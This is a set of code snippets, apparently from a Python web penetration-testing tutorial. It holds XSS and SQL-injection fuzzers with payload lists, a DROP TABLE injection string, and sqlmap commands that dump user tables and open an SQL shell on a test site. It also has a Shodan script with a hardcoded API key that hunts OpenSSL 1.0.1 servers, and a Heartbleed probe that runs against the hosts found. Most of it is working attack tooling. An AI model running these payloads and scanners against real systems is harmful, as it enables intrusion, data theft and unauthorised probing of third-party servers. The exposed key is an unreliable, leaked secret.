["```py\nimport requests\nimport sys\nfrom bs4 import BeautifulSoup, SoupStrainer\nurl = 'http://testphp.vulnweb.com/search.php?test=query'\ndata ={}\n\nresponse = requests.get(url)\nwith open('XSS-attack-vectors.txt') as file:\n    for payload in file:\n        for field in BeautifulSoup(response.text, \"html.parser\",parse_only=SoupStrainer('input')):\n            print(field)\n            if field.has_attr('name'):\n                if field['name'].lower() == \"submit\":\n                    data[field['name']] = \"submit\"\n                else:\n                    data[field['name']] = payload\n\n        response = requests.post(url, data=data)\n        if payload in response.text:\n            print(\"Payload \"+ payload +\" returned\")\n        data ={}\n```", "```py\n<SCRIPT>alert('XSS');</SCRIPT>\n<script>alert('XSS');</script>\n<BODY ONLOAD=alert('XSS')>\n<scrscriptipt>alert('XSS');</scrscriptipt>\n<SCR%00IPT>alert(\\\"XSS\\\")</SCR%00IPT>\n```", "```py\nfrom w3af.core.controlles.w3afCore import w3afCore\n\nw3af = w3afCore()\n\n#list of plugins in audit category\npluginType = w3af.plugins.get_plugin_list('audit')\nfor plugin in pluginType:\n    print 'Plugin:'+plugin\n\n#list of available plugin categories\nplugins_types = w3af.plugins.get_plugin_types()\nfor plugin in plugins_types:\n    print 'Plugin type:'+plugin\n\n#list of enabled plugins\nplugins_enabled = w3af.plugins.get_enabled_plugin('audit')\nfor plugin in plugins_enabled:\n    print 'Plugin enabled:'+plugin\n```", "```py\nfrom w3af.core.controlles.w3afCore import w3afCore\n\nw3af = w3afCore()\n\n#list of profiles\nprofiles = w3af.profiles.get_profile_list()\nfor profile in profiles:\n    print 'Profile desc:'+profile.get_desc()\n    print 'Profile file:'+profile.get_profile_file()\n    print 'Profile name:'+profile.get_name()\n    print 'Profile target:'+profile.get_target().get(\"target\")\n\nw3af.profiles.use_profile('profileName')\nw3af.profiles.save_current_to_new_profile('profileName','Profile description')\n```", "```py\n$variable = $_POST['input'];\nmysql_query(\"INSERT INTO `table` (`column`) VALUES ('$variable')\");\n```", "```py\nINSERT INTO `table` (`column`) VALUES('value'); DROP TABLE table;--')\n```", "```py\nimport requests url = \"http://testphp.vulnweb.com/listproducts.php?cat=\"\n\nwith open('sql-attack-vector.txt') as file:\nfor payload in file:\n    print (\"Testing \"+ url + payload)\n    response = requests.post(url+payload)\n    #print(response.text)\n    if \"mysql\" in response.text.lower():\n        print(\"Injectable MySQL detected\")\n        print(\"Attack string: \"+payload)\n    elif \"native client\" in response.text.lower():\n        print(\"Injectable MSSQL detected\")\n        print(\"Attack string: \"+payload)\n    elif \"syntax error\" in response.text.lower():\n        print(\"Injectable PostGRES detected\")\n        print(\"Attack string: \"+payload)\n    elif \"ORA\" in response.text.lower():\n        print(\"Injectable Oracle detected\")\n        print(\"Attack string: \"+payload)\n    else:\n        print(\"Not Injectable\")\n```", "```py\n\" or \"a\"=\"a\n\" or \"x\"=\"x\n\" or 0=0 #\n\" or 0=0 --\n\" or 1=1 or \"\"=\"\n\" or 1=1--\n```", "```py\nsudo apt-get install sqlmap\n```", "```py\ngit clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n```", "```py\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart --tables\n```", "```py\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart -T users\n--columns\n```", "```py\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump\n```", "```py\n$ python sqlmap.py -u [URL] --users\nsqlmap.py -u \"http://testphp.vulnweb.com/listproducts.php?cat=*\" --users\n```", "```py\n$ python sqlmap.py -u [URL] -D [Database] -T [table] --columns\nsqlmap.py -u \"http://testphp.vulnweb.com/listproducts.php?cat=*\" -D acuart -T users --columns\n```", "```py\n$ python sqlmap.py -u [URL] --sql-shell\nsqlmap.py -u \"http://testphp.vulnweb.com/listproducts.php?cat=*\" --sql-shell\n```", "```py\npip install -r requirements.txt\n```", "```py\npython DorkMe.py --url http://testphp.vulnweb.com/listproducts.php --dorks vulns -v\n```", "```py\n$ git clone https://github.com/DanMcInerney/xsscrapy.git\n$ pip install -r requirements.txt\n```", "```py\npython xsscrapy.py -u http://testphp.vulnweb.com\n```", "```py\nimport shodan\nimport socket\nSHODAN_API_KEY = \"v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik\"\napi = shodan.Shodan(SHODAN_API_KEY)\n# Wrap the request in a try/ except block to catch errors\ntry:\n    # Search Shodan OpenSSL/1.0.1\n    results = api.search('OpenSSL/1.0.1')\n    # Show the results\n    print('Total Vulnerable servers: %s' % results['total'])\n    for result in results['matches']:\n        print('IP: %s' % result['ip_str'])\n        print('Hostname: %s' % socket.getfqdn(result['ip_str']))\n        print(result['data'])\nexcept shodan.APIError as e:\n    print('Error: %s' % e)\n```", "```py\ndef shodanSearchVulnerable(self,query):\n    results = self.shodanApi.search(query)\n    # Show the results\n    print('Results found: %s' % results['total'])\n    print('-------------------------------------')\n    for result in results['matches']:\n        try:\n            print('IP: %s' % result['ip_str'])\n            print(result['data'])\n            host = self.obtain_host_info(result['ip_str'])\n            portArray = []\n            for i in host['data']:\n                port = str(i['port'])\n                portArray.append(port)\n            print('Checking port 443........................')\n            #check heartbeat vulnerability in port 443\n            checkVulnerability(result['ip_str'],'443')\n        except Exception as e:\n            print('Error connecting: %s' % e)\n            continue\n        except socket.timeout:\n            print('Error connecting Timeout error: %s' % e)\n            continue\n\n    print('-----------------------------------------------')\n    print('Final Results')\n    print('-----------------------------------------------')\n    if len(server_vulnerable) == 0:\n        print('No Server vulnerable found')\n    if len(server_vulnerable) > 0:\n        print('Server vulnerable found ' + str(len(server_vulnerable)))\n\n    for server in server_vulnerable:\n        print('Server vulnerable: '+ server)\n        print(self.obtain_host_info(server))\n```", "```py\ndef checkVulnerability(ip,port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        print('Connecting with ...' + ip + ' Port: '+ port)\n        sys.stdout.flush()\n        s.connect((ip, int(port)))\n        print('Sending Client Request...')\n        sys.stdout.flush()\n        s.send(hello)\n        print('Waiting for Server Request...')\n        sys.stdout.flush()\n        while True:\n            typ, ver, pay = recvmsg(s)\n            if typ == None:\n                print('Server closed connection without sending Server Request.')\n                break\n            # Look for server hello done message.\n            if typ == 22 and ord(pay[0]) == 0x0E:\n                break\n            print('Sending heartbeat request...')\n            sys.stdout.flush()\n            s.send(hb)\n            if hit_hb(s):\n                server_vulnerable.append(ip)\n    except socket.timeout:\n        print(\"TimeOut error\")\n```", "```py\nnmap -p 443 \u2014script ssl-heartbleed [IP Address]\n```"]